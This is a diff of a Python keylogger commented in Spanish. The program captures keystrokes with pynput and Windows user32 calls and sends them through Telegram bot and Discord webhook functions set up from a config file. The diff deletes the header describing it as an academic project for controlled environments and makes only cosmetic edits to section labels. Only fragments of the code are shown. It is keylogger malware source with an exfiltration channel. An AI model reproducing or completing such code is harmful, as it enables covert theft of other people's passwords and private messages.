@@ -1,10 +1,5 @@
 # ============================================================
-# keylogger_edu.py
-# Proyecto académico - Uso exclusivo en entorno controlado
-# ============================================================
-
-# ============================================================
-# 1. IMPORTS
+#  IMPORTS
 # ============================================================
 import requests
 from pynput import keyboard
@@ -27,7 +22,6 @@ except ImportError:
 TOKEN               = config.TG_TOKEN
 CHAT_ID             = config.TG_CHAT_ID
 DISCORD_WEBHOOK_URL = config.DISCORD_WEBHOOK_URL
-user32 = ctypes.windll.user32
 
 if not TOKEN or not CHAT_ID or not DISCORD_WEBHOOK_URL:
     print("[!] config.py tiene valores vacíos")
@@ -49,7 +43,7 @@ def obtener_ventana_activa():
 
 
 # ============================================================
-# 2. ESTADO GLOBAL
+# ESTADO GLOBAL
 # ============================================================
 buffer_teclas    = ""
 lock             = threading.Lock()
@@ -58,10 +52,11 @@ dead_key_pending = None
 
 
 # ============================================================
-# 3. CONSTANTES
+#  CONSTANTES
 # ============================================================
 VK_SHIFT   = 0x10
 VK_CAPITAL = 0x14
+user32 = ctypes.windll.user32
 
 VKS_TECLAS_MUERTAS = {0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xBA, 0xDE, 0xDB, 0xDD}
 
@@ -100,7 +95,7 @@ MODIFICADORES = {
 
 
 # ============================================================
-# 4. FUNCIONES AUXILIARES
+#  FUNCIONES AUXILIARES
 # ============================================================
 def obtener_estado_teclado():
     """Devuelve (shift_activo, caps_lock_activo) consultando al SO."""
@@ -111,7 +106,7 @@ def obtener_estado_teclado():
 
 
 # ============================================================
-# 5. FUNCIONES DE ENVÍO
+# FUNCIONES DE ENVÍO
 # ============================================================
 def enviar_telegram(mensaje):
     if not mensaje.strip():
@@ -143,7 +138,7 @@ def enviar_discord(mensaje):
 
 
 # ============================================================
-# 6. HILO DE ENVÍO
+# HILO DE ENVÍO
 # ============================================================
 def hilo_envio():
     global buffer_teclas
@@ -170,7 +165,7 @@ def hilo_envio():
 
 
 # ============================================================
-# 7. CALLBACKS DE TECLADO
+# CALLBACKS DE TECLADO
 # ============================================================
 def on_press(key):
     global buffer_teclas, dead_key_pending
@@ -232,7 +227,7 @@ def on_release(key):
 
 
 # ============================================================
-# 8. MAIN
+# MAIN :D
 # ============================================================
 if __name__ == "__main__":
     print("[*] Keylogger educativo iniciado. ESC para detener.")
